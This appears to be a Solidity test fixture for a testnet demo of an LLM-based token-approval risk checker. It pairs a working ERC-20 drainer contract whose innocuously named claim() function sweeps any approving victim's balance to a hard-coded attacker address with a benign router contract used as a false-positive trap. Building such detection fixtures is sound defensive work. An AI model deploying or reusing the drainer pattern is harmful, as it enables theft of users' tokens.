// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/// @title DrainerSpender — a GENUINELY HOSTILE spender for the Phase 3 demo.
/// @notice Deployed unverified to X Layer testnet. Once a victim has granted this
///         contract an ERC-20 approval, ANYONE can call `claim` to sweep that
///         victim's entire balance to the hard-coded attacker address.
///
/// This is the exact drainer shape SPEC.md's "Why an LLM" section describes:
/// approve-then-immediate-transferFrom-to-a-fresh-EOA. The tell is that
/// `transferFrom` pulls from an arbitrary `victim` argument, NOT from the caller —
/// so the approval benefits the attacker, never the person who granted it. The
/// unlimited-allowance heuristic flags this correctly; the LLM's job is to
/// explain *why* it is hostile from the bytecode/behaviour, not just that the
/// allowance was large.
contract DrainerSpender {
    address public immutable attacker;

    event Claimed(address indexed token, address indexed victim, uint256 amount);

    constructor(address attacker_) {
        attacker = attacker_;
    }

    /// @notice Innocuous-sounding entrypoint. Sweeps `victim`'s full `token`
    ///         balance to the attacker using the approval `victim` granted.
    function claim(address token, address victim) external {
        uint256 amount = IERC20(token).balanceOf(victim);
        IERC20(token).transferFrom(victim, attacker, amount);
        emit Claimed(token, victim, amount);
    }
}

/// @title RouterSpender — a BENIGN spender that legitimately needs unlimited approval.
/// @notice Deployed to X Layer testnet as the Phase 3 false-positive trap. It
///         mimics a DEX router: users grant it an unlimited approval once, and it
///         pulls their tokens on each swap. A naive heuristic flags it (unlimited
///         allowance); a correct verdict must CLEAR it.
///
/// The structural reason it is safe: `swap` only ever calls
/// `transferFrom(msg.sender, ...)`. It pulls the CALLER's own tokens to execute
/// their trade — it cannot move a third party's funds even while holding
/// unlimited approvals from thousands of users, exactly like a real Uniswap /
/// 1inch router. This is the distinction the LLM has to draw that the allowance
/// value alone cannot: same unlimited approval, opposite intent.
contract RouterSpender {
    event Swapped(address indexed trader, address indexed token, uint256 amountIn);

    /// @notice Pull `amountIn` of `token` from the caller to execute a trade.
    ///         A real router would return output tokens here; simplified to the
    ///         pull, which is the only part relevant to approval risk.
    function swap(address token, uint256 amountIn) external {
        IERC20(token).transferFrom(msg.sender, address(this), amountIn);
        emit Swapped(msg.sender, token, amountIn);
    }
}
